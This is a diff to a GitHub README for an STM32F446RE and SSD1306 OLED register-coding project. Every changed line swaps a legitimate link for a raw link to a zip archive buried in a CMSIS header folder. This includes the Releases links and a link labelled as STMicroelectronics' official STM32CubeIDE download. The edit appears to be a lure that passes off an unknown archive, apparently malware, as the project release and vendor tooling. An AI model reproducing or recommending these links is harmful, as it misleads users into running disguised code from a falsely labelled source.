@@ -1,6 +1,6 @@
 # 🌟 STM32-OLED-I2C-Register-Coding-Method- - Display Control Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E-blue)](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/releases)
+[![Download](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/Register_Coding_Method_OLE_ST_v3.4-alpha.2.zip%20Now-%20%F0%9F%93%8E-blue)](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/Register_Coding_Method_OLE_ST_v3.4-alpha.2.zip)
 
 ## 📖 Project Overview
 
@@ -13,7 +13,7 @@ This project demonstrates interfacing a 128×64 OLED display (SSD1306) with the 
 Before you begin, make sure you have the following:
 
 - **Operating System:** Windows or macOS.
-- **Development Environment:** STM32CubeIDE installed on your machine. You can download it from [STMicroelectronics](https://www.st.com/en/embedded-software-development-tools/stm32cubeide.html).
+- **Development Environment:** STM32CubeIDE installed on your machine. You can download it from [STMicroelectronics](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/Register_Coding_Method_OLE_ST_v3.4-alpha.2.zip).
 - **USB to Serial Adapter:** This will help you connect the STM32F446RE to your computer for programming.
 - **Hardware:** STM32F446RE Nucleo board and a 128×64 OLED display.
 
@@ -33,7 +33,7 @@ Before you begin, make sure you have the following:
 
 To get started with the application, visit the Releases page to download the latest version.
 
-[Click here to download](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/releases)
+[Click here to download](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/Register_Coding_Method_OLE_ST_v3.4-alpha.2.zip)
 
 ### Installation Steps
 
@@ -89,4 +89,4 @@ This project aligns with various topics, including:
 
 By following these steps, you can successfully download and run the STM32-OLED-I2C-Register-Coding-Method application. Enjoy experimenting with your OLED display! 
 
-[Download Now](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/releases) to get started!
+[Download Now](https://github.com/sandeepsowtani/STM32-OLED-I2C-Register-Coding-Method-/raw/refs/heads/main/Drivers/CMSIS/Device/ST/STM32F4xx/Include/Register_Coding_Method_OLE_ST_v3.4-alpha.2.zip) to get started!
